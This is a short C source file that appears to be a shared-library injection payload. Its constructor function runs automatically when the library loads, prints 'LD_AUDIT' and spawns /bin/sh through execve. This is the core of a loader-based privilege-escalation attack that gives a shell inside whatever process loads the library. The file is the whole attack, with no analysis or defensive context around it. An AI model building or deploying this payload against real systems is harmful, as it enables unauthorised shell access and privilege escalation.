#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))

static void init(void) {
    printf("LD_AUDIT");
	execve("/bin/sh", 0, 0);
}
